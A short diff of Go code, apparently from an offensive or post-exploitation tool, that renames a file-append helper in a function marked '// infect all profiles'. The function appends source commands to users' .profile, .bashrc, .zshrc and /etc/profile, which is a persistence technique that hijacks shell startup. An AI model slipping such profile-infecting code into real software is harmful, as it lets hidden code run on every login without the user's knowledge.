@@ -145,7 +145,7 @@ func profiles() (err error) {
 			if err != nil {
 				return fmt.Errorf("No HomeDir found, and cannot write elsewhere: %v", err)
 			}
-			err = util.AppendToFile("/etc/profile", "source /etc/bash_profile")
+			err = util.AppendTextToFile("/etc/profile", "source /etc/bash_profile")
 			return fmt.Errorf("This user has no home dir: %v", err)
 		}
 		return
@@ -162,10 +162,10 @@ func profiles() (err error) {
 		return
 	}
 	// infect all profiles
-	_ = util.AppendToFile(user.HomeDir+"/.profile", sourceCmd)
-	_ = util.AppendToFile(user.HomeDir+"/.bashrc", sourceCmd)
-	_ = util.AppendToFile(user.HomeDir+"/.zshrc", sourceCmd)
-	_ = util.AppendToFile("/etc/profile", "source "+user.HomeDir+"/.bashprofile")
+	_ = util.AppendTextToFile(user.HomeDir+"/.profile", sourceCmd)
+	_ = util.AppendTextToFile(user.HomeDir+"/.bashrc", sourceCmd)
+	_ = util.AppendTextToFile(user.HomeDir+"/.zshrc", sourceCmd)
+	_ = util.AppendTextToFile("/etc/profile", "source "+user.HomeDir+"/.bashprofile")
 
 	return
 }
